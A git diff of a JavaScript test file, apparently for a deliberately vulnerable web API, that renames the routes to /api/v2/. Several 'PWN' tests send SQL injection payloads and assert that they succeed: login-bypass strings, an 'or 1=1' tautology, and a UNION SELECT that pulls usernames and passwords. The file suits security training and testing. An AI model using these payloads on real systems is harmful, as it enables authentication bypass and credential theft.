@@ -19,9 +19,9 @@ describe("Basic tests", function () {
       });
   });
 
-  it("POST /api/login: Legit login should work", function (done) {
+  it("POST /api/v2/login: Legit login should work", function (done) {
     chai.request(app)
-      .post("/api/login")
+      .post("/api/v2/login")
       .send({ username: "admin", password: "123" })
       .end(function (err, res) {
         accessToken = res.body.token
@@ -30,9 +30,9 @@ describe("Basic tests", function () {
       });
   });
 
-  it("PWN /api/login: Aggressive SQL injection login should work", function (done) {
+  it("PWN /api/v2/login: Aggressive SQL injection login should work", function (done) {
     chai.request(app)
-      .post("/api/login")
+      .post("/api/v2/login")
       .send({ username: "admin", password: "' or 1=1;-- " })
       .end(function (err, res) {
         res.should.have.status(200)
@@ -40,9 +40,9 @@ describe("Basic tests", function () {
       });
   });
 
-  it("PWN /api/login: Non-aggressive SQL injection login should work", function (done) {
+  it("PWN /api/v2/login: Non-aggressive SQL injection login should work", function (done) {
     chai.request(app)
-      .post("/api/login")
+      .post("/api/v2/login")
       .send({ username: "admin", password: "' or '1'='1" })
       .end(function (err, res) {
         res.should.have.status(200)
@@ -54,9 +54,9 @@ describe("Basic tests", function () {
 
 describe("Authenticated tests", function () {
 
-  it("GET /api/users: Show type 2 users", function (done) {
+  it("GET /api/v2/users: Show type 2 users", function (done) {
     chai.request(app)
-      .get("/api/users/type/2")
+      .get("/api/v2/users/type/2")
       .set({ Authorization: `Bearer ${accessToken}` })
       .end(function (err, res) {
         res.should.have.status(200)
@@ -64,9 +64,9 @@ describe("Authenticated tests", function () {
       });
   });
 
-  it("PWN /api/users: SQL injection all users", function (done) {
+  it("PWN /api/v2/users: SQL injection all users", function (done) {
     chai.request(app)
-      .get("/api/users/type/2 or 1=1")
+      .get("/api/v2/users/type/2 or 1=1")
       .set({ Authorization: `Bearer ${accessToken}` })
       .end(function (err, res) {
         res.should.have.status(200)
@@ -75,9 +75,9 @@ describe("Authenticated tests", function () {
       });
   });
 
-  it("PWN /api/users: SQL injection extract user password", function (done) {
+  it("PWN /api/v2/users: SQL injection extract user password", function (done) {
     chai.request(app)
-      .get("/api/users/type/2 UNION SELECT username || '-' || password, username FROM users")
+      .get("/api/v2/users/type/2 UNION SELECT username || '-' || password, username FROM users")
       .set({ Authorization: `Bearer ${accessToken}` })
       .end(function (err, res) {
         res.should.have.status(200)
@@ -86,10 +86,10 @@ describe("Authenticated tests", function () {
       });
   });
 
-  it("POST /api/messages/new: Adding new post", function (done) {
+  it("POST /api/v2/messages/new: Adding new post", function (done) {
     testPostMessage = "test message " + (new Date()).toISOString();
     chai.request(app)
-      .post("/api/messages/new")
+      .post("/api/v2/messages/new")
       .set({ Authorization: `Bearer ${accessToken}` })
       .send({ message: testPostMessage })
       .end(function (err, res) {
@@ -98,9 +98,9 @@ describe("Authenticated tests", function () {
       });
   });
 
-  it("GET /api/messages: Check added post", function (done) {
+  it("GET /api/v2/messages: Check added post", function (done) {
     chai.request(app)
-      .get("/api/messages")
+      .get("/api/v2/messages")
       .set({ Authorization: `Bearer ${accessToken}` })
       .end(function (err, res) {
         res.should.have.status(200)
